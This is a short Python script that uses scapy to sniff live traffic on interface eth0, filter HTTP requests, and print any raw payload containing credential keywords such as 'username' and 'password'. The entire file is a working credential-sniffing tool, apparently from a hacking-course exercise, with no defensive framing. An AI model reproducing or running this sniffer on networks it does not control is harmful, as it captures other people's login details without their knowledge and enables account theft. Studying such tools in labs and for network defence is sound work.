#!/usr/bin/env python

import scapy.all as scapy
from scapy.layers import http

def sniff(interface):
    scapy.sniff(iface=interface, store=False, prn=packet_sniff)

def packet_sniff(packet):
    if packet.haslayer(http.HTTPRequest):
        if packet.haslayer(scapy.Raw):
            load = packet[scapy.Raw].load  ## this is use for scapy layer for raw layer
            keywords = ["username", "user", "login", "password", "pass"]
            for keyword in keywords:  # Changed from 'keywords' to 'keyword'
                if keyword in load:
                    print(load)
                    break

sniff("eth0")
